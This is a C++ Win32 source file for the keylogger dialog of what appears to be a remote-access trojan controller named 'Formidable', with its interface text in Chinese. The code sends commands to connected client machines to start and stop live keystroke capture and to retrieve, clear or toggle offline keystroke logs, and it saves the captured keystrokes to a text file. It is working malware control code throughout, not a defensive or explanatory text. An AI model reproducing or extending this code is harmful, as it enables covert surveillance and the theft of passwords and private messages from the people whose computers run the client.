#include "KeylogDialog.h"
#include "../GlobalState.h"
#include "../resource.h"
#include "../../Common/Config.h"
#include "../../Common/ClientTypes.h"
#include <map>
#include <mutex>
#include <vector>
#include <commdlg.h>
#include "../Utils/StringHelper.h"

extern std::map<uint32_t, std::shared_ptr<Formidable::ConnectedClient>> g_Clients;
extern std::mutex g_ClientsMutex;
extern bool SendDataToClient(std::shared_ptr<Formidable::ConnectedClient> client, const void* pData, int iLength);

static std::map<HWND, uint32_t> s_keylogDlgToClientId;

INT_PTR CALLBACK KeylogDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_INITDIALOG: {
        uint32_t clientId = (uint32_t)lParam;
        s_keylogDlgToClientId[hDlg] = clientId;
        
        SendMessageW(hDlg, WM_SETICON, ICON_SMALL, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_KEYLOGGER)));
        SendMessageW(hDlg, WM_SETICON, ICON_BIG, (LPARAM)LoadIconW(g_hInstance, MAKEINTRESOURCEW(IDI_KEYLOGGER)));
        
        // 设置标题
        std::shared_ptr<Formidable::ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }
        
        if (client) {
            std::wstring title = L"键盘记录 - " + Formidable::Utils::StringHelper::UTF8ToWide(client->computerName);
            SetWindowTextW(hDlg, title.c_str());
            
            // 先请求离线记录
            {
                Formidable::CommandPkg pkg = { 0 };
                pkg.cmd = Formidable::CMD_KEYLOG;
                pkg.arg1 = 3; // 3 = 获取离线记录
                
                size_t bodySize = sizeof(Formidable::CommandPkg);
                std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
                Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
                memcpy(header->flag, "FRMD26?", 7);
                header->originLen = (int)bodySize;
                header->totalLen = (int)buffer.size();
                memcpy(buffer.data() + sizeof(Formidable::PkgHeader), &pkg, bodySize);
                
                SendDataToClient(client, buffer.data(), (int)buffer.size());
            }
            
            // 延迟100ms后启动实时记录
            Sleep(100);
            
            // 启动实时键盘记录
            {
                Formidable::CommandPkg pkg = { 0 };
                pkg.cmd = Formidable::CMD_KEYLOG;
                pkg.arg1 = 1; // 1 = 启动
                
                size_t bodySize = sizeof(Formidable::CommandPkg);
                std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
                Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
                memcpy(header->flag, "FRMD26?", 7);
                header->originLen = (int)bodySize;
                header->totalLen = (int)buffer.size();
                memcpy(buffer.data() + sizeof(Formidable::PkgHeader), &pkg, bodySize);
                
                SendDataToClient(client, buffer.data(), (int)buffer.size());
            }
        }
        
        return (INT_PTR)TRUE;
    }
    case WM_SIZE: {
        RECT rc;
        GetClientRect(hDlg, &rc);
        MoveWindow(GetDlgItem(hDlg, IDC_EDIT_KEYLOG), 0, 0, rc.right, rc.bottom, TRUE);
        return (INT_PTR)TRUE;
    }
    case WM_CONTEXTMENU: {
        HMENU hMenu = CreatePopupMenu();
        AppendMenuW(hMenu, MF_STRING, IDM_KEYLOG_GET_OFFLINE, L"获取离线记录(&O)");
        AppendMenuW(hMenu, MF_STRING, IDM_KEYLOG_CLEAR_OFFLINE, L"清空离线记录(&C)");
        AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
        AppendMenuW(hMenu, MF_STRING, IDM_KEYLOG_TOGGLE_OFFLINE, L"切换离线记录开关(&T)");
        AppendMenuW(hMenu, MF_SEPARATOR, 0, NULL);
        AppendMenuW(hMenu, MF_STRING, IDM_KEYLOG_SAVE_FILE, L"保存到文件(&S)");
        AppendMenuW(hMenu, MF_STRING, IDM_KEYLOG_CLEAR_WINDOW, L"清空窗口(&W)");
        
        POINT pt;
        GetCursorPos(&pt);
        TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hDlg, NULL);
        DestroyMenu(hMenu);
        return (INT_PTR)TRUE;
    }
    case WM_COMMAND: {
        if (LOWORD(wParam) == IDCANCEL) {
            PostMessage(hDlg, WM_CLOSE, 0, 0);
            return (INT_PTR)TRUE;
        }
        
        uint32_t clientId = s_keylogDlgToClientId[hDlg];
        std::shared_ptr<Formidable::ConnectedClient> client;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            if (g_Clients.count(clientId)) client = g_Clients[clientId];
        }
        
        switch (LOWORD(wParam)) {
        case IDM_KEYLOG_GET_OFFLINE: {
            // 获取离线记录
            if (client) {
                Formidable::CommandPkg pkg = { 0 };
                pkg.cmd = Formidable::CMD_KEYLOG;
                pkg.arg1 = 3; // 3 = 获取离线记录
                
                size_t bodySize = sizeof(Formidable::CommandPkg);
                std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
                Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
                memcpy(header->flag, "FRMD26?", 7);
                header->originLen = (int)bodySize;
                header->totalLen = (int)buffer.size();
                memcpy(buffer.data() + sizeof(Formidable::PkgHeader), &pkg, bodySize);
                
                SendDataToClient(client, buffer.data(), (int)buffer.size());
                MessageBoxW(hDlg, L"正在获取离线记录...", L"提示", MB_OK);
            }
            break;
        }
        case IDM_KEYLOG_CLEAR_OFFLINE: {
            // 清空离线记录
            if (client) {
                if (MessageBoxW(hDlg, L"确定要清空客户端的离线记录吗？", L"确认", MB_YESNO | MB_ICONQUESTION) == IDYES) {
                    Formidable::CommandPkg pkg = { 0 };
                    pkg.cmd = Formidable::CMD_KEYLOG;
                    pkg.arg1 = 4; // 4 = 清空离线记录
                    
                    size_t bodySize = sizeof(Formidable::CommandPkg);
                    std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
                    Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
                    memcpy(header->flag, "FRMD26?", 7);
                    header->originLen = (int)bodySize;
                    header->totalLen = (int)buffer.size();
                    memcpy(buffer.data() + sizeof(Formidable::PkgHeader), &pkg, bodySize);
                    
                    SendDataToClient(client, buffer.data(), (int)buffer.size());
                    MessageBoxW(hDlg, L"已清空离线记录", L"提示", MB_OK);
                }
            }
            break;
        }
        case IDM_KEYLOG_TOGGLE_OFFLINE: {
            // 切换离线记录开关
            if (client) {
                static bool offlineEnabled = true;
                offlineEnabled = !offlineEnabled;
                
                Formidable::CommandPkg pkg = { 0 };
                pkg.cmd = Formidable::CMD_KEYLOG;
                pkg.arg1 = 5; // 5 = 控制离线记录开关
                pkg.arg2 = offlineEnabled ? 1 : 0;
                
                size_t bodySize = sizeof(Formidable::CommandPkg);
                std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
                Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
                memcpy(header->flag, "FRMD26?", 7);
                header->originLen = (int)bodySize;
                header->totalLen = (int)buffer.size();
                memcpy(buffer.data() + sizeof(Formidable::PkgHeader), &pkg, bodySize);
                
                SendDataToClient(client, buffer.data(), (int)buffer.size());
                
                std::wstring msg = offlineEnabled ? L"已启用离线记录" : L"已禁用离线记录";
                MessageBoxW(hDlg, msg.c_str(), L"提示", MB_OK);
            }
            break;
        }
        case IDM_KEYLOG_SAVE_FILE: {
            // 保存到文件
            wchar_t szFile[MAX_PATH] = L"";
            OPENFILENAMEW ofn = { 0 };
            ofn.lStructSize = sizeof(OPENFILENAMEW);
            ofn.hwndOwner = hDlg;
            ofn.lpstrFilter = L"文本文件 (*.txt)\0*.txt\0所有文件 (*.*)\0*.*\0";
            ofn.lpstrFile = szFile;
            ofn.nMaxFile = MAX_PATH;
            ofn.Flags = OFN_OVERWRITEPROMPT;
            ofn.lpstrDefExt = L"txt";
            
            if (GetSaveFileNameW(&ofn)) {
                HWND hEdit = GetDlgItem(hDlg, IDC_EDIT_KEYLOG);
                int len = GetWindowTextLengthW(hEdit);
                if (len > 0) {
                    std::vector<wchar_t> buffer(len + 1);
                    GetWindowTextW(hEdit, buffer.data(), len + 1);
                    
                    FILE* f = _wfopen(szFile, L"w, ccs=UTF-8");
                    if (f) {
                        fwrite(buffer.data(), sizeof(wchar_t), len, f);
                        fclose(f);
                        MessageBoxW(hDlg, L"保存成功", L"提示", MB_OK);
                    } else {
                        MessageBoxW(hDlg, L"保存失败", L"错误", MB_OK | MB_ICONERROR);
                    }
                }
            }
            break;
        }
        case IDM_KEYLOG_CLEAR_WINDOW: {
            // 清空窗口
            if (MessageBoxW(hDlg, L"确定要清空当前窗口内容吗？", L"确认", MB_YESNO | MB_ICONQUESTION) == IDYES) {
                SetDlgItemTextW(hDlg, IDC_EDIT_KEYLOG, L"");
            }
            break;
        }
        }
        break;
    }
    case WM_CLOSE: {
        // 发送停止键盘记录命令
        if (s_keylogDlgToClientId.count(hDlg)) {
            uint32_t clientId = s_keylogDlgToClientId[hDlg];
            std::shared_ptr<Formidable::ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) {
                    client = g_Clients[clientId];
                    client->hKeylogDlg = NULL;
                }
            }
            
            if (client) {
                Formidable::CommandPkg pkg = { 0 };
                pkg.cmd = Formidable::CMD_KEYLOG;
                pkg.arg1 = 0; // 0 = 停止
                
                size_t bodySize = sizeof(Formidable::CommandPkg);
                std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
                Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
                memcpy(header->flag, "FRMD26?", 7);
                header->originLen = (int)bodySize;
                header->totalLen = (int)buffer.size();
                memcpy(buffer.data() + sizeof(Formidable::PkgHeader), &pkg, bodySize);
                
                SendDataToClient(client, buffer.data(), (int)buffer.size());
            }
            
            s_keylogDlgToClientId.erase(hDlg);
        }
        DestroyWindow(hDlg);
        return (INT_PTR)TRUE;
    }
    }
    return (INT_PTR)FALSE;
}
